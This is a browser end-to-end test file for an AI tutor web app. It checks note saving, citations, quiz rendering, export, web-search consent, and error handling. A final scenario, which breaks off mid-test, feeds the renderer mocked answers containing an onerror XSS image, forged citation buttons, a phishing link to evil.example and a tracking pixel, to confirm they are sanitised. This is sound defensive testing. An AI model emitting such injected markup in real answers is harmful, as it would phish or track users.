  assert.match(await page.$eval(".ai-tutor__message--assistant .ai-tutor__web-status.is-used", (node) => node.textContent), /evidence used/i, "completed current-web request did not visibly report that web evidence was used");
  await clickByText(page, ".ai-tutor__message--assistant .ai-tutor__message-actions button", "Approach");
  assert.match(await page.$eval(".ai-tutor__approach", (node) => node.textContent.replace(/\s+/g, " ")), /Library retrieval attached [1-9]/i, "whole-library retrieval trace was not visible in the Approach panel");
  assert.equal((await page.$$(".ai-tutor__consent input")).length, 0, "remembered local disclosure unexpectedly asked for every request");
  await withOptions(page, async () => {
    assert.equal(await page.$eval(".ai-tutor__web-search input", (input) => input.checked), false, "one-request web authorization was not consumed");
  });
  assert.equal(await page.$eval(sendSelector, (button) => button.disabled), true, "send stayed enabled after the completed prompt was cleared");
  await waitForStoredHistory(page, "nonempty");

  // Answer-to-note: a completed prose response can be saved as a labeled
  // AI-origin notebook clipping with durable provenance (AI-001).
  await clickByText(page, ".ai-tutor__message--assistant .ai-tutor__message-actions button", "Save to notes");
  await page.waitForFunction(() => new Promise((resolve) => {
    const request = indexedDB.open("lumen-ai-notes", 1);
    request.onerror = () => resolve(false);
    request.onsuccess = () => {
      const get = request.result.transaction("study-data", "readonly").objectStore("study-data").get("profile");
      get.onerror = () => resolve(false);
      get.onsuccess = () => resolve((get.result?.clippings || []).some((clip) => clip.origin === "ai-tutor"));
    };
  }), { timeout: 8_000 });
  const profileWithNote = await readProfile(page);
  const savedNote = profileWithNote.clippings.find((clip) => clip.origin === "ai-tutor");
  assert.ok(savedNote, "saved AI answer did not become an ai-tutor clipping");
  assert.match(savedNote.title, /^AI /, "saved AI note lost its mode-labelled title");
  assert.match(savedNote.note, /AI-generated draft/i, "saved AI note is not labeled as a generated draft");
  assert.doesNotMatch(savedNote.text, /\[W\d+\](?!\()/, "web citations were not materialized into durable links");
  assert.equal(profileWithNote.clippings.filter((clip) => clip.origin === "ai-tutor").length, 1, "one save action must create exactly one clipping");
  // Saved stays focusable (aria-disabled) so keyboard focus is not dropped;
  // activating it again must not create a second clipping.
  assert.equal(
    await page.$eval(".ai-tutor__message--assistant .ai-tutor__message-actions", (node) => [...node.querySelectorAll("button")].find((button) => /saved to notes/i.test(button.textContent))?.getAttribute("aria-disabled")),
    "true",
    "the save action did not disable after saving",
  );
  await clickByText(page, ".ai-tutor__message--assistant .ai-tutor__message-actions button", "Saved to notes");
  await new Promise((resolve) => setTimeout(resolve, 600));
  assert.equal((await readProfile(page)).clippings.filter((clip) => clip.origin === "ai-tutor").length, 1, "activating Saved to notes again created a second clipping");

  // Trigger the delegated citation action directly. The asynchronous local
  // history commit can replace this rendered Markdown subtree between
  // Puppeteer's scroll and click phases on a fast machine.
  await page.evaluate(async () => {
    for (let attempt = 0; attempt < 6 && !window.location.hash.startsWith("#/read/"); attempt += 1) {
      document.querySelector(".ai-tutor__message--assistant button.ai-tutor__citation[data-ai-citation]")?.click();
      await new Promise((resolve) => window.setTimeout(resolve, 80));
    }
  });
  await page.waitForFunction(() => window.location.hash.startsWith("#/read/"), { timeout: 8_000 }).catch(async (error) => {
    const diagnostic = await page.evaluate(() => ({
      hash: window.location.hash,
      citation: document.querySelector(".ai-tutor__message--assistant button.ai-tutor__citation[data-ai-citation]")?.outerHTML || null,
      toast: document.querySelector(".toast")?.textContent?.replace(/\s+/g, " ").trim() || null,
    }));
    error.message += `\nCitation diagnostic: ${JSON.stringify(diagnostic)}\nRuntime errors: ${runtimeErrors.join(" | ") || "none"}`;
    throw error;
  });
  await page.waitForSelector(".markdown-body", { timeout: 10_000 });
  assert.match(await page.evaluate(() => window.location.hash), /^#\/read\//, "citation did not navigate to its source document");
  // TF-2: the cited section, not the saved reading position, owns the first
  // scroll. The reader focuses the cited heading; it must also be in view.
  const citedPlacement = await page.waitForFunction(() => {
    const heading = document.activeElement;
    const scroller = document.querySelector(".reader-scroll");
    if (!scroller || !/^H[1-4]$/u.test(heading?.tagName || "")) return false;
    const offset = heading.getBoundingClientRect().top - scroller.getBoundingClientRect().top;
    return offset > -4 && offset < 160 ? { heading: heading.textContent.trim(), offset: Math.round(offset) } : false;
  }, { timeout: 5_000 }).then((handle) => handle.jsonValue()).catch(async () => page.evaluate(() => ({
    active: document.activeElement?.tagName, text: document.activeElement?.textContent?.trim().slice(0, 60),
    offset: Math.round((document.activeElement?.getBoundingClientRect().top || 0) - (document.querySelector(".reader-scroll")?.getBoundingClientRect().top || 0)),
  })));
  assert.ok(citedPlacement?.heading, `citation opened the lesson but not the cited section: ${JSON.stringify(citedPlacement)}`);

  await page.evaluate(() => { window.location.hash = "#/ai"; });
  await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
  await page.waitForSelector(".ai-tutor__message--assistant", { timeout: 10_000 });
  await chooseMode(page, "Quiz");
  assert.equal(await activeMode(page), "Quiz");
  assert.equal(await page.$eval(sendSelector, (button) => button.disabled), false, "remembered local acknowledgement did not carry into a local-only follow-up");
  await page.$eval(sendSelector, (button) => button.click());
  await page.waitForSelector(".ai-tutor__quiz", { timeout: 10_000 });
  assert.equal(calls.respond.length, 2, "structured quiz request was not sent exactly once");
  const quizRequest = calls.respond[1];
  assert.equal(quizRequest.body.task, "quiz");
  assert.equal(quizRequest.body.responseFormat, "structured");
  assert.equal(quizRequest.body.maxOutputTokens, secureConfig.responseProfiles.outputTokens.balanced, "structured mode exceeded the selected profile output ceiling");
  assert.equal(quizRequest.body.webSearch, false, "web search persisted across a remounted tutor without renewed selection");
  assert.ok(Buffer.byteLength(JSON.stringify(quizRequest.body), "utf8") <= secureConfig.limits.maxRequestUtf8Bytes, "submitted structured request exceeded the payload that enabled Send");
  assert.ok(quizRequest.body.history.length >= 2 && quizRequest.body.history.length <= 12, "bounded conversation history was not sent to the follow-up quiz");
  assert.equal((await page.$$(".ai-tutor__quiz-question")).length, 1, "validated quiz did not render exactly one question");
  assert.equal((await page.$$(".ai-tutor__quiz-options label")).length, 3, "quiz options did not match the validated structure");
  await settleScroll(page);
  await page.click(".ai-tutor__quiz-options label:nth-child(2) input");
  await clickByText(page, ".ai-tutor__quiz-question button", "Check answer");
  await page.waitForSelector(".ai-tutor__quiz-feedback.is-correct");
  assert.match(await page.$eval(".ai-tutor__quiz-feedback", (node) => node.textContent), /final untouched estimate/i);
  // Structured fields render math through KaTeX; the question text is one
  // grid cell beside its number; options are lettered and the result is
  // stated in text, not colour alone; focus follows to the feedback.
  assert.ok((await page.$$(".ai-tutor__quiz-feedback .katex")).length > 0, "quiz math rendered as raw TeX");
  assert.equal(await page.$eval(".ai-tutor__quiz", (node) => node.textContent.includes("$")), false, "raw $ delimiters remained in the quiz");
  assert.deepEqual(await page.$eval(".ai-tutor__quiz-question legend", (node) => [...node.children].map((child) => child.className)), ["ai-tutor__quiz-number", "ai-tutor__inline-md ai-tutor__quiz-prompt"], "the quiz question text was split across the legend grid");
  assert.deepEqual(await page.$$eval(".ai-tutor__quiz-options label", (nodes) => nodes.map((node) => node.textContent.trim().slice(0, 2))), ["A.", "B.", "C."], "quiz options were not lettered");
  assert.match(await page.$eval(".ai-tutor__quiz-options label.is-correct", (node) => node.textContent), /Your answer · correct/, "the correct answer was marked by colour only");
  assert.match(await page.$eval(".ai-tutor__quiz-feedback", (node) => node.textContent), /Correct — B is right/);
  assert.equal(await page.evaluate(() => document.activeElement?.classList.contains("ai-tutor__quiz-feedback")), true, "focus did not move to the quiz feedback that replaced Check answer");

  // Copy and Export produce readable Markdown: code and math unchanged,
  // structured results as learners saw them, and [S#] labels resolved.
  await page.evaluate(() => {
    window.__lumenAuditCopies = [];
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText: async (value) => { window.__lumenAuditCopies.push(value); } } });
    window.__lumenAuditDownloads = [];
    URL.createObjectURL = (blob) => { window.__lumenAuditDownloads.push(blob); return "blob:lumen-audit"; };
    URL.revokeObjectURL = () => {};
    const click = HTMLAnchorElement.prototype.click;
    HTMLAnchorElement.prototype.click = function auditClick() { if (!this.download) click.call(this); };
  });
  await page.$$eval(".ai-tutor__message--assistant", (nodes) => nodes.find((node) => node.querySelector(".ai-tutor__response-text"))?.querySelector(".ai-tutor__message-actions button")?.click());
  await page.waitForFunction(() => window.__lumenAuditCopies.length === 1);
  const copiedProse = await page.evaluate(() => window.__lumenAuditCopies[0]);
  assert.match(copiedProse, /score = evaluate\(frozen_model, holdout\)/, "Copy stripped underscores from code");
  assert.match(copiedProse, /\$L = \\frac\{1\}\{n\}\\sum_i \\ell_i\$/, "Copy corrupted inline math");
  assert.match(copiedProse, /\*\*final holdout\*\*/, "Copy did not keep the Markdown source");
  assert.match(copiedProse, /\nSources:\n- \[S\d+\] /, "Copy did not resolve the answer's citation labels");
  await page.$eval(".ai-tutor__message--assistant:has(.ai-tutor__quiz) .ai-tutor__message-actions button", (button) => button.click());
  await page.waitForFunction(() => window.__lumenAuditCopies.length === 2);
  const copiedQuiz = await page.evaluate(() => window.__lumenAuditCopies[1]);
  assert.doesNotMatch(copiedQuiz, /"correctIndex"|^\{/, "Copy of a quiz produced raw JSON");
  assert.match(copiedQuiz, /### Quiz: Leakage and evaluation[\s\S]*- B\. Only after model and threshold choices are frozen[\s\S]*\*\*Answer:\*\* B\./, "Copy of a quiz was not readable");
  await page.click('[aria-label="Export conversation as Markdown"]');
  await page.waitForFunction(() => window.__lumenAuditDownloads.length === 1);
  const exported = await page.evaluate(() => window.__lumenAuditDownloads[0].text());
  assert.match(exported, /## Lumen Tutor · Explain · Balanced/, "export headings omitted mode and profile");
  assert.match(exported, /## Lumen Tutor · Quiz · Balanced[\s\S]*### Quiz: Leakage and evaluation/, "export did not format the quiz");
  assert.doesNotMatch(exported, /"correctIndex"/, "export contained raw quiz JSON");
  assert.match(exported, /Sources:\n- \[S\d+\] /, "export citations had no source list");

  await waitForStoredHistory(page, 4);
  const stored = await readProfile(page);
  assert.ok(stored.aiTutorHistory.length >= 4 && stored.aiTutorHistory.length <= 50, "integrated host did not persist bounded tutor history");
  for (const message of stored.aiTutorHistory) {
    for (const source of message.citationSources || []) {
      assert.equal("text" in source, false, "persisted citation duplicated full source text");
      assert.equal("content" in source, false, "persisted citation duplicated source content");
      assert.equal("markdown" in source, false, "persisted citation duplicated source Markdown");
      assert.equal("text" in (source.original || {}), false, "persisted navigation target duplicated full source text");
    }
    for (const source of message.webSources || []) {
      assert.equal(typeof source.url, "string", "persisted web source lost its URL");
      assert.equal("content" in source, false, "persisted web source duplicated an unbounded result body");
    }
  }

  await page.click('button[aria-label="Open settings"]');
  await page.waitForSelector(".settings-drawer");
  await clickByText(page, ".settings-drawer button", "Clear AI history");
  await page.waitForSelector(".ai-tutor__welcome");
  await waitForStoredHistory(page, "empty");
  assert.equal((await readProfile(page)).aiTutorHistory.length, 0, "Settings clear did not remove locally persisted history");
  // Click the visible drawer control. The identically labelled scrim spans the
  // viewport behind the drawer, so clicking its geometric centre can be
  // intercepted by the drawer itself in real browsers.
  await page.click(".settings-close");
  await page.waitForSelector(".settings-drawer", { hidden: true });
  assert.equal((await page.$$(".ai-tutor__message")).length, 0, "the mounted tutor resurrected history after Settings cleared it");
  await page.close();

  const retryConsent = await newAuditPage("retry-consent", () => secureConfig, { failFirstResponse: true });
  await retryConsent.page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
  await retryConsent.page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
  await retryConsent.page.$eval(".ai-tutor__composer textarea", (field) => {
    const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set;
    setter.call(field, "What is the latest current guidance on evaluation leakage?");
    field.dispatchEvent(new Event("input", { bubbles: true }));
  });
  await withOptions(retryConsent.page, () => retryConsent.page.locator(".ai-tutor__web-search input").click());
  await retryConsent.page.$eval(sendSelector, (button) => button.scrollIntoView({ block: "nearest", behavior: "instant" }));
  assert.equal(await retryConsent.page.$eval(sendSelector, (button) => {
    const box = button.getBoundingClientRect();
    return button.contains(document.elementFromPoint(box.x + box.width / 2, box.y + box.height / 2));
  }), true, "Generate is covered by another control");
  await retryConsent.page.locator(sendSelector).click();
  await retryConsent.page.waitForSelector(".ai-tutor__request-error", { timeout: 10_000 }).catch(async (error) => {
    console.error(JSON.stringify({ scenario: "retry-consent", calls: retryConsent.calls.respond.length, page: await retryConsent.page.evaluate(() => ({ route: location.hash, text: document.body.innerText.slice(0, 1_500) })), runtimeErrors }));
    throw error;
  });
  assert.equal(retryConsent.calls.respond.length, 1, "initial retry fixture request count was wrong");
  assert.match(await retryConsent.page.$eval(".ai-tutor__request-error .ai-tutor__web-status.is-failed", (node) => node.textContent), /fallback failed/i, "failed current-web request did not visibly identify the failed fallback");
  assert.equal(await retryConsent.page.$eval(".ai-tutor__request-error button", (button) => button.disabled), true, "web-search retry did not require renewed one-request authorization");
  await withOptions(retryConsent.page, () => retryConsent.page.locator(".ai-tutor__web-search input").click());
  assert.equal(await retryConsent.page.$eval(".ai-tutor__request-error button", (button) => button.disabled), false, "renewed web authorization did not enable retry");
  await retryConsent.page.click(".ai-tutor__request-error button");
  await retryConsent.page.waitForSelector(".ai-tutor__message--assistant", { timeout: 10_000 });
  assert.equal(retryConsent.calls.respond.length, 2, "retry was not sent exactly once after renewed consent");
  assert.equal(retryConsent.calls.respond[1].body.webSearch, true, "retry lost the disclosed web-search scope");
  await withOptions(retryConsent.page, async () => {
    assert.equal(await retryConsent.page.$eval(".ai-tutor__web-search input", (input) => input.checked), false, "retry web authorization was not consumed");
  });
  await retryConsent.page.close();

  // An approved search that returns nothing usable degrades to a library-only
  // answer with the server's notice; its badge must say the fallback failed,
  // not that the web was not needed.
  const webUnavailable = await newAuditPage("web-unavailable", () => secureConfig, { webSearchUnavailable: true });
  await webUnavailable.page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
  await webUnavailable.page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
  await webUnavailable.page.$eval(".ai-tutor__composer textarea", (field) => {
    const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set;
    setter.call(field, "What is the latest current guidance on evaluation leakage?");
    field.dispatchEvent(new Event("input", { bubbles: true }));
  });
  await withOptions(webUnavailable.page, () => webUnavailable.page.locator(".ai-tutor__web-search input").click());
  // Earlier scenarios share this browser profile and its saved conversation.
  const answeredBefore = await webUnavailable.page.$$eval(".ai-tutor__message--assistant", (nodes) => nodes.length);
  await webUnavailable.page.locator(sendSelector).click();
  await webUnavailable.page.waitForFunction((count) => document.querySelectorAll(".ai-tutor__message--assistant:not(.ai-tutor__message--streaming)").length > count && !document.querySelector(".ai-tutor__message--streaming"), { timeout: 10_000 }, answeredBefore);
  assert.equal(webUnavailable.calls.respond.at(-1)?.body.webSearch, true, "the degraded-web scenario did not authorize a web search");
  const degraded = await webUnavailable.page.$$eval(".ai-tutor__message--assistant", (nodes) => {
    const last = nodes.at(-1);
    const badge = last.querySelector(".ai-tutor__web-status");
    return { text: last.querySelector(".ai-tutor__response-text")?.textContent || "", badge: badge ? `${badge.className} ${badge.textContent}` : "" };
  });
  assert.match(degraded.text, /Current-web evidence unavailable/, "the library-only notice was not shown");
  assert.match(degraded.badge, /is-failed .*fallback failed/i, `a search that kept no web evidence was not reported as a failed fallback: ${degraded.badge}`);
  await webUnavailable.page.close();

  const staleConfig = await newAuditPage("stale-config", () => secureConfig, {
    failFirstResponse: true,
    failFirstResponseCode: "VALIDATION_ERROR",
  });
  await staleConfig.page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
  await staleConfig.page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
  await staleConfig.page.$eval(".ai-tutor__composer textarea", (field) => {
    const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set;
    setter.call(field, "Explain validation drift briefly.");
    field.dispatchEvent(new Event("input", { bubbles: true }));
  });
  await staleConfig.page.locator(sendSelector).click();
  await staleConfig.page.waitForSelector(".ai-tutor__request-error", { timeout: 10_000 });
  for (let attempt = 0; attempt < 20 && staleConfig.calls.config.length < 2; attempt += 1) {
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
  assert.ok(staleConfig.calls.config.length >= 2, "a server contract rejection did not force a fresh configuration check");
  assert.equal(await staleConfig.page.$(".ai-tutor__request-error button"), null, "a stale request snapshot remained retryable after configuration invalidation");
  assert.match(await staleConfig.page.$eval(".ai-tutor__composer-notice", (node) => node.textContent), /refreshed|changed/iu, "the learner was not told that limits were refreshed");
  await staleConfig.page.close();

  const lostServer = await newAuditPage("lost-server", () => secureConfig, { abortFirstResponse: true });
  await lostServer.page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
  await lostServer.page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
  await lostServer.page.$eval(".ai-tutor__composer textarea", (field) => {
    const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set;
    setter.call(field, "Explain server recovery briefly.");
    field.dispatchEvent(new Event("input", { bubbles: true }));
  });
  await lostServer.page.locator(sendSelector).click();
  await lostServer.page.waitForSelector(".ai-tutor__request-error", { timeout: 10_000 });
  for (let attempt = 0; attempt < 20 && lostServer.calls.config.length < 2; attempt += 1) {
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
  assert.ok(lostServer.calls.config.length >= 2, "a lost integrated server did not force a fresh configuration check");
  assert.equal(await lostServer.page.$(".ai-tutor__request-error button"), null, "a stale request remained retryable after the integrated server disappeared");
  await lostServer.page.close();

  const unsafeConfig = {
    ...secureConfig,
    privacy: { ...secureConfig.privacy, apiKeyExposedToBrowser: true },
  };
  const unsafe = await newAuditPage("unsafe", () => unsafeConfig);
  await unsafe.page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
  await unsafe.page.waitForSelector(".ai-tutor__connection--insecure", { timeout: 10_000 });
  assert.match(await unsafe.page.$eval(".ai-tutor__connection--insecure", (node) => node.textContent), /local, no-paid-API privacy contract/i);
  assert.equal(await unsafe.page.$eval(sendSelector, (button) => button.disabled), true, "unsafe configuration did not fail closed");
  assert.equal(unsafe.calls.respond.length, 0, "unsafe configuration reached the AI response endpoint");
  await unsafe.page.close();

  // A completion-capable model without attested thinking support must disable
  // the Deep profile with a reason instead of letting the request fail
  // upstream (AI-002 capability gating).
  const nonThinkingConfig = {
    ...secureConfig,
    service: { ...secureConfig.service, thinkingCapable: false },
  };
  const nonThinking = await newAuditPage("non-thinking", () => nonThinkingConfig);
  await nonThinking.page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
  await nonThinking.page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
  await openOptions(nonThinking.page);
  assert.equal(
    await nonThinking.page.$eval('.ai-tutor__response-profiles input[value="deep"]', (input) => input.disabled),
    true,
    "Deep profile stayed selectable without attested thinking capability",
  );
  assert.match(
    await nonThinking.page.$eval('.ai-tutor__response-profiles label.is-unavailable', (node) => node.textContent),
    /attests thinking support/i,
    "disabled Deep profile did not explain its capability requirement",
  );
  assert.equal(
    await nonThinking.page.$eval('.ai-tutor__response-profiles input[value="balanced"]', (input) => input.disabled),
    false,
    "capability gating wrongly disabled a non-deep profile",
  );
  await nonThinking.page.close();

  // A personal-note citation must open the exact note editor, not merely the
  // related document (AI-001 exact personal-note deep link).
  const noteScenario = await newAuditPage("personal-note", () => secureConfig);
  await noteScenario.page.goto(baseUrl, { waitUntil: "networkidle2", timeout: 30_000 });
  await noteScenario.page.evaluate(() => new Promise((resolve, reject) => {
    const request = indexedDB.open("lumen-ai-notes", 1);
    request.onupgradeneeded = () => {
      if (!request.result.objectStoreNames.contains("study-data")) request.result.createObjectStore("study-data");
    };
    request.onerror = () => reject(request.error);
    request.onsuccess = () => {
      const transaction = request.result.transaction("study-data", "readwrite");
      const store = transaction.objectStore("study-data");
      const get = store.get("profile");
      get.onerror = () => reject(get.error);
      get.onsuccess = () => {
        const profile = get.result && typeof get.result === "object" ? get.result : {};
        profile.personalNotes = {
          ...(profile.personalNotes || {}),
          "notes/00-roadmap.md": "The zephyrine-quorum trick keeps optimizer updates stable during long study sessions.",
        };
        // A saved reading place the note citation must keep (it scrolls no heading).
        profile.readingPositions = { ...(profile.readingPositions || {}), "notes/00-roadmap.md": 0.5 };
        const put = store.put(profile, "profile");
        put.onerror = () => reject(put.error);
        put.onsuccess = () => resolve();
      };
    };
  }));
  await noteScenario.page.evaluate(() => { window.location.hash = "#/ai"; });
  await noteScenario.page.reload({ waitUntil: "networkidle2", timeout: 30_000 });
  await noteScenario.page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
  // Earlier scenarios share this browser's history. Wait for a new answer,
  // otherwise an old citation can satisfy the selector before this one arrives.
  const previousNoteAnswers = await noteScenario.page.$$eval('.ai-tutor__message--assistant', (nodes) => nodes.length);
  await noteScenario.page.$eval(".ai-tutor__composer textarea", (field) => {
    const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set;
    setter.call(field, "Explain the zephyrine-quorum trick from my notes.");
    field.dispatchEvent(new Event("input", { bubbles: true }));
  });
  if (await noteScenario.page.$(".ai-tutor__consent input")) await noteScenario.page.click(".ai-tutor__consent input");
  await noteScenario.page.$eval(sendSelector, (button) => button.click());
  await noteScenario.page.waitForFunction((count) => document.querySelectorAll('.ai-tutor__message--assistant').length > count && !document.querySelector('.ai-tutor__message--streaming'), { timeout: 15_000 }, previousNoteAnswers);
  await noteScenario.page.waitForSelector(".ai-tutor__message--assistant button.ai-tutor__citation[data-ai-citation]", { timeout: 15_000 });
  // The interception callback records the call asynchronously; the rendered
  // citation can beat it by a tick. Poll briefly instead of flaking.
  {
    const deadline = Date.now() + 5_000;
    while (Date.now() < deadline && !noteScenario.calls.respond.length) await new Promise((resolve) => setTimeout(resolve, 100));
  }
  const notePrompt = noteScenario.calls.respond.at(-1);
  assert.ok(notePrompt, "the mocked respond call was never recorded");
  assert.match(notePrompt.body.context, /Personal note/i, "library-first retrieval did not attach the matching personal note");
  assert.match(notePrompt.body.context, /zephyrine-quorum/i, "the personal note body was not supplied as source text");
  await noteScenario.page.evaluate(async () => {
    // The audit browser shares one origin profile, so earlier scenarios'
    // stored conversation can precede this one; the newest message is last.
    for (let attempt = 0; attempt < 6 && !window.location.hash.startsWith("#/read/"); attempt += 1) {
      [...document.querySelectorAll(".ai-tutor__message--assistant button.ai-tutor__citation[data-ai-citation]")].at(-1)?.click();
      await new Promise((resolve) => setTimeout(resolve, 250));
    }
  });
  assert.match(await noteScenario.page.evaluate(() => window.location.hash), /^#\/read\//, "personal-note citation did not open its document");
  await noteScenario.page.waitForSelector(".personal-note-panel textarea", { timeout: 10_000 });
  await noteScenario.page.waitForFunction(
    () => document.activeElement === document.querySelector(".personal-note-panel textarea"),
    { timeout: 8_000 },
  );
  assert.match(
    await noteScenario.page.$eval(".personal-note-panel textarea", (field) => field.value),
    /zephyrine-quorum/i,
    "the focused editor did not contain the cited personal note",
  );
  // The citation target skips the saved-position restore (TF-2); a note
  // citation claims no scroll, so the lecture still opens at its saved place.
  const noteLecturePlace = await noteScenario.page.$eval(".reader-scroll", (node) => node.scrollTop / Math.max(1, node.scrollHeight - node.clientHeight));
  assert.ok(noteLecturePlace > 0.35 && noteLecturePlace < 0.65, `a personal-note citation dropped the saved reading place (at ${noteLecturePlace.toFixed(2)} of the lecture, saved 0.50)`);
  await noteScenario.page.close();

  // Model output is untrusted (issue #69). DOMPurify keeps <button> and
  // data-* attributes, so raw HTML in an answer must render as text: a forged
  // citation button is not a control and navigates nowhere, and the only
  // citation control is the renderer's own [S#] button. A separate context
  // keeps this answer out of the shared conversation history.
  const forgedContext = await browser.createBrowserContext();
  try {
    const page = await forgedContext.newPage();
    await page.setViewport({ width: 393, height: 852, deviceScaleFactor: 1, isMobile: true, hasTouch: true });
    attachDiagnostics(page, "forged-citation");
    const forgedLabel = "Open the forged source";
    // Issue #81: a Markdown image must not load, and a link to the app's own
    // host is text like an in-app route. Hostile flashcards follow the answer
    // into Review. Any request to the tracking host is recorded.
    const appOrigin = new URL(baseUrl).origin;
    const trackerRequests = [];
    page.on("request", (request) => {
      if (new URL(request.url()).hostname === "tracker.example") trackerRequests.push(request.url());
    });
    const hostileCards = {
      cards: [{
        front: `Which control is real? <button class="ai-tutor__citation" type="button" data-ai-citation="S1">${forgedLabel}</button>`,
        back: `Neither. ![Card pixel](https://tracker.example/card.png?q=answer) [Open the app copy](${appOrigin}/#/read/notes/part-02-mathematics/06-experiments-and-information.md)`,
        hint: null,
        tags: ["security"],
      }],
    };
    await installAiMocks(page, () => secureConfig, {
      flashcards: hostileCards,
      answerText: (citation) => [
        `Repeated holdout inspection leaks evaluation information. [${citation}]`,
        "",
        `<button class="ai-tutor__citation" type="button" data-ai-citation="${citation}" aria-label="Open citation">${forgedLabel}</button>`,
        "",
        `<span data-ai-citation="${citation}">Forged span</span> and <a href="#/read/notes" data-ai-citation="${citation}">forged anchor</a>.`,
        "",
        "<img src=\"x\" onerror=\"window.__lumenForgedCitationXss = true\">",
        "",
        `Linked evidence [[${citation}]](https://evil.example/phish) and [Open the forged lecture](#/read/notes/part-02-mathematics/06-experiments-and-information.md).`,
        "",
        "![Tracking pixel](https://tracker.example/pixel.png?q=holdout-prompt)",
        "",
        `Same host: [Open the app copy](${appOrigin}/#/read/notes/part-02-mathematics/06-experiments-and-information.md).`,
      ].join("\n"),
    });
    await page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
    await page.$eval(".ai-tutor__composer textarea", (field) => {
      Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(field, "Why does repeated holdout inspection leak evaluation information?");
      field.dispatchEvent(new Event("input", { bubbles: true }));
    });
    if (await page.$(".ai-tutor__consent input")) await page.click(".ai-tutor__consent input");
    await page.$eval(sendSelector, (button) => button.click());
    await page.waitForFunction((label) => !document.querySelector(".ai-tutor__message--streaming")
      && [...document.querySelectorAll(".ai-tutor__message--assistant .ai-tutor__response-text")].at(-1)?.textContent.includes(label), { timeout: 15_000 }, forgedLabel);
    const rendered = await page.evaluate((label) => {
      const answer = [...document.querySelectorAll(".ai-tutor__message--assistant .ai-tutor__response-text")].at(-1);
      const walker = document.createTreeWalker(answer, NodeFilter.SHOW_TEXT);
      let text = walker.nextNode();
      while (text && !text.textContent.includes(label)) text = walker.nextNode();
      text.parentElement.scrollIntoView({ block: "center" });
      const range = document.createRange();
      range.setStart(text, text.textContent.indexOf(label));
      range.setEnd(text, text.textContent.indexOf(label) + label.length);
      const box = range.getBoundingClientRect();
      const point = { x: Math.round(box.left + box.width / 2), y: Math.round(box.top + box.height / 2) };
      const hit = document.elementFromPoint(point.x, point.y);
      return {
        controls: [...answer.querySelectorAll("[data-ai-citation]")].map((node) => `${node.tagName}.${node.className}:${node.textContent}`),
        buttons: [...answer.querySelectorAll("button")].map((node) => node.textContent.trim()),
        forgedAnchors: answer.querySelectorAll('a[href="#/read/notes"]').length,
        images: answer.querySelectorAll("img").length,
        showsMarkup: answer.textContent.includes('<button class="ai-tutor__citation"') && answer.textContent.includes("<span data-ai-citation="),
        links: [...answer.querySelectorAll("a")].map((node) => node.getAttribute("href")),
        citationsInLinks: answer.querySelectorAll("a [data-ai-citation], a .ai-tutor__citation").length,
        linkedLine: [...answer.querySelectorAll("p")].find((node) => node.textContent.startsWith("Linked evidence"))?.textContent || "",
        hit: { tag: hit?.tagName || "", insideAnswer: Boolean(hit && answer.contains(hit)), control: Boolean(hit?.closest("button, a, [data-ai-citation]")) },
        point,
      };
    }, forgedLabel);
    // Two genuine [S#] buttons: the first line's and the one the model wrapped
    // in a link. That link, and the one to an app route, render as text.
    assert.equal(rendered.controls.length, 2, `a model-authored element carried data-ai-citation: ${JSON.stringify(rendered.controls)}`);
    rendered.controls.forEach((control) => assert.match(control, /^BUTTON\.ai-tutor__citation:\[S\d+\]$/, "a citation control was not the renderer's [S#] button"));
    assert.deepEqual(rendered.links, ["https://tracker.example/pixel.png?q=holdout-prompt"], "a model link to an app route, to the app's host or around a citation rendered as a link, or an image did not become a link");
    assert.equal(rendered.citationsInLinks, 0, "a citation control sat inside a model-authored link");
    assert.match(rendered.linkedLine, /^Linked evidence \[S\d+\] and Open the forged lecture\.$/, "the linked citation line lost its text");
    assert.equal(rendered.buttons.includes(forgedLabel), false, "the forged citation rendered as a button");
    assert.equal(rendered.forgedAnchors, 0, "a model-authored anchor rendered as a link");
    assert.equal(rendered.images, 0, "a model-authored image rendered");
    assert.equal(rendered.showsMarkup, true, "model-authored markup was not shown to the learner as text");
    assert.deepEqual(rendered.hit, { tag: "P", insideAnswer: true, control: false }, "the forged citation text was hit-testable as a control");
    await page.mouse.click(rendered.point.x, rendered.point.y);
    await new Promise((resolve) => setTimeout(resolve, 400));
    assert.equal(await page.evaluate(() => window.location.hash), "#/ai", "clicking a forged citation navigated to a source");
    const routeLabel = await page.evaluate(() => {
      const line = [...document.querySelectorAll(".ai-tutor__message--assistant .ai-tutor__response-text p")].find((node) => node.textContent.startsWith("Linked evidence"));
      const text = [...line.childNodes].find((node) => node.nodeType === Node.TEXT_NODE && node.textContent.includes("Open the forged lecture"));
      const range = document.createRange();
      range.setStart(text, text.textContent.indexOf("Open"));
      range.setEnd(text, text.textContent.indexOf("Open") + "Open the forged lecture".length);
      const box = range.getBoundingClientRect();
      return { x: Math.round(box.left + box.width / 2), y: Math.round(box.top + box.height / 2) };
    });
    await page.mouse.click(routeLabel.x, routeLabel.y);
